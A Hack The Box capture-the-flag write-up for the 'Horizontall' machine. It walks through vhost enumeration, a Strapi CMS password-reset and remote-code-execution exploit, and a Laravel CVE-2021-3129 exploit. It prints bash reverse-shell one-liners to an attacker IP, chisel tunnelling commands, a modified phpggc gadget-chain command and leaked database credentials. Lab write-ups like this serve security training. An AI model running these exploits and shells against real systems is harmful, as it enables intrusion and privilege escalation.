# Horizontall

Completed: Yes Created: October 2, 2021 7:52 PM Platform: Hack The Box

## Enumeration

### Nmap

```bash
PORT   STATE SERVICE VERSION                                                                                                                                                                                                                 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                                                                                            
80/tcp open  http    nginx 1.14.0 (Ubuntu)                                                                                                                                                                                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### http

Nothing with dir scanning. But `www` with ffuf and vhosts scanning:

```bash
┌──(root💀kali)-[~/…/Easy/Horizontall/enum/http]
└─# ffuf -u http://horizontall.htb/ -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.horizontall.htb" --mc 200                                                                                          2 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/
 :: Wordlist         : FUZZ: /root/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

www                     [Status: 200, Size: 901, Words: 43, Lines: 2]
:: Progress: [19966/19966] :: Job [1/1] :: 573 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```

With a large subdomains wordlists I found another vhost:

```bash
┌──(root💀kali)-[~/…/Easy/Horizontall/enum/http]
└─# ffuf -u http://horizontall.htb/ -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" --mc 200 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/
 :: Wordlist         : FUZZ: /root/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.horizontall.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

www                     [Status: 200, Size: 901, Words: 43, Lines: 2]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20]
:: Progress: [114441/114441] :: Job [1/1] :: 564 req/sec :: Duration: [0:03:23] :: Errors: 0 ::
```

Now, with feroxbuster I found the following dirs:

```bash
200        1l       21w      507c http://api-prod.horizontall.htb/reviews
403        1l        1w       60c http://api-prod.horizontall.htb/users
200       16l      101w      854c http://api-prod.horizontall.htb/admin
200        1l       21w      507c http://api-prod.horizontall.htb/Reviews
200        3l       21w      121c http://api-prod.horizontall.htb/robots.txt
403        1l        1w       60c http://api-prod.horizontall.htb/Users
200       16l      101w      854c http://api-prod.horizontall.htb/Admin
```

/admin - strapi software (CMS).

/reviews - returned json data or reviws.

/users - 403 forbidden.

Just search in google for possible exploits on CMS Strapi: [https://www.exploit-db.com/exploits/50239](https://www.exploit-db.com/exploits/50239).

## Gaining access

I didn't know if it is the correct version for exploit. I just used it and got RCE. The vulnerability exists because of not proper input sanitization. With this lack, we can do command injection in JSON POST data. Info about vulnerability: [https://bittherapy.net/post/strapi-framework-remote-code-execution/](https://bittherapy.net/post/strapi-framework-remote-code-execution/).

Using the complete exploit([https://www.exploit-db.com/exploits/50239](https://www.exploit-db.com/exploits/50239)):

```bash
┌──(root💀kali)-[/tmp]
└─# python3 strapi-exploi.py http://api-prod.horizontall.htb/
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit

[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMzMTk3OTgwLCJleHAiOjE2MzU3ODk5ODB9.ZRc8QtD2uVRFikoFic6FKpRAhvHgMtguFj4KSDfiOE8

$> /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.15/5555 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>

$>
```

```bash
┌──(root💀kali)-[~]
└─# nc -lnvp 5555                                                                                                                                                                                                                        1 ⨯
listening on [any] 5555 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.105] 33220
bash: cannot set terminal process group (1885): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$
```

## Privilege escalation

Checking configs on credentials:

```bash
strapi@horizontall:~/myapi/config/environments$ cat development/database.json
cat development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

Credentials are not from developer user. Exploring mysql:

```bash
mysql> select * from strapi_administrator
select * from strapi_administrator
    -> ;
;
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
| id | username | email                 | password                                                     | resetPasswordToken | blocked |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
|  3 | admin    | admin@horizontall.htb | $2a$10$fP13.nimEd.97PxsIp6afef9nchddXMEhK.YHIJ6AqfNHTQ6D7DKG | NULL               |    NULL |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
1 row in set (0.00 sec)

mysql>
```

We have 2 different ports - 1337 and 8000. To access it easily and maybe exploit it further, I used port-forwarding with chisel:

Start a server on port 9999:

```bash
┌──(root💀kali)-[~/tools]
└─# ./chisel server -p 9999 --reverse                                                                                                                                                                                                    1 ⨯
2021/10/02 14:59:28 server: Reverse tunnelling enabled
2021/10/02 14:59:28 server: Fingerprint hnLWungm+SFXDbE2xhkXHvZu7Pzb7Tjb3XfG7hwiQdg=
2021/10/02 14:59:28 server: Listening on http://0.0.0.0:9999
2021/10/02 15:00:24 server: session#1: tun: proxy#R:1337=>1337: Listening
2021/10/02 15:00:53 server: session#2: tun: proxy#R:8000=>8000: Listening
```

Run chisel on the box in client mode with specified ports to forward and also use nohup to make it on a long way.

```bash
strapi@horizontall:/tmp$ nohup ./chisel client 10.10.14.15:9999 R:1337:127.0.0.1:1337 &
:1337 &/chisel client 10.10.14.15:9999 R:1337:127.0.0.1:
[1] 62194
strapi@horizontall:/tmp$ nohup: ignoring input and appending output to 'nohup.out'

strapi@horizontall:/tmp$ nohup ./chisel client 10.10.14.15:9999 R:8000:127.0.0.1:8000 &
:8000 &/chisel client 10.10.14.15:9999 R:8000:127.0.0.1:
[2] 62215
strapi@horizontall:/tmp$
```

After that, I saw Laravel v8. Tried `/profiles` and saw debug mode which indicates about CVE: [https://github.com/ambionics/laravel-exploits](https://github.com/ambionics/laravel-exploits). But I used a different exploit: [https://github.com/zhzyker/CVE-2021-3129](https://github.com/zhzyker/CVE-2021-3129).

```bash
┌──(root💀kali)-[~/tools/CVE-2021-3129]
└─# python3 exp.py http://127.0.0.1:8000/
[*] Try to use Laravel/RCE1 for exploitation.
[+]exploit:
[*] Laravel/RCE1 Result:

[*] Try to use Laravel/RCE2 for exploitation.
[+]exploit:
[*] Laravel/RCE2 Result:

uid=0(root) gid=0(root) groups=0(root)

[*] Try to use Laravel/RCE3 for exploitation.
[+]exploit:
[*] Laravel/RCE3 Result:

[*] Try to use Laravel/RCE4 for exploitation.
[+]exploit:
[*] Laravel/RCE4 Result:

uid=0(root) gid=0(root) groups=0(root)

[*] Try to use Laravel/RCE5 for exploitation.
[+]exploit:
[*] Laravel/RCE5 Result:

uid=0(root) gid=0(root) groups=0(root)

[*] Try to use Laravel/RCE6 for exploitation.
[+]exploit:
[*] Laravel/RCE6 Result:

uid=0(root) gid=0(root) groups=0(root)

[*] Try to use Laravel/RCE7 for exploitation.
[+]exploit:
[*] Laravel/RCE7 Result:

[*] Try to use Monolog/RCE1 for exploitation.
[+]exploit:
[*] Monolog/RCE1 Result:

uid=0(root) gid=0(root) groups=0(root)

[*] Try to use Monolog/RCE2 for exploitation.
[+]exploit:
[*] Monolog/RCE2 Result:

uid=0(root) gid=0(root) groups=0(root)

[*] Try to use Monolog/RCE3 for exploitation.
[+]exploit:
[*] Monolog/RCE3 Result:

[*] Try to use Monolog/RCE4 for exploitation.
[+]exploit:
[*] Monolog/RCE4 Result:
```

Exploit works and we have root. Now, we need to change one gadget that works on rev shell to our box and we will have a root shell:

```python
class EXP:
    #这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用
    __gadget_chains = {
        "Laravel/RCE1":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE2":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.15/6666 0>&1'" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
```

```bash
┌──(root💀kali)-[~]
└─# nc -lnvp 6666                                                        
listening on [any] 6666 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.105] 45366
bash: cannot set terminal process group (62851): Inappropriate ioctl for device
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public#
```
